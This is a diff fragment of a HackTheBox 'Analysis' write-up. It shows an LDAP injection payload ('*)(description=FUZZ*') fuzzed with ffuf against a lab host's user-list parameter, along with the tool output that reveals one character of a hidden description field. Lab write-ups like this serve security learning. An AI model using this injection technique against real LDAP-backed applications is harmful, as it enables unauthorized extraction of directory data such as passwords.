@@ -294,7 +294,40 @@ But putting it into the paramter i get the user
 ❯❯❯ ffuf -u 'http://internal.analysis.htb/users/list.php?name=*)(description=FUZZ*' -w chars.txt
 ```
 
-After running this command i get a few different response sizes `406,418,8` however t
+After running this command i get a few different response sizes `406,418,8` however there is only multiple 406s and a few 8s
+
+```python
+❯❯❯ ffuf -u 'http://internal.analysis.htb/users/list.php?name=*)(description=FUZZ*' -w chars.txt -fs 406,8
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.3.0
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://internal.analysis.htb/users/list.php?name=*)(description=FUZZ*
+ :: Wordlist         : FUZZ: /home/kali/htb/analysis/chars.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response size: 406,8
+________________________________________________
+
+                        [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 33ms]
+9                       [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 94ms]
+:: Progress: [94/94] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
+```
+
+And i get a 9
+
+
 
 
 
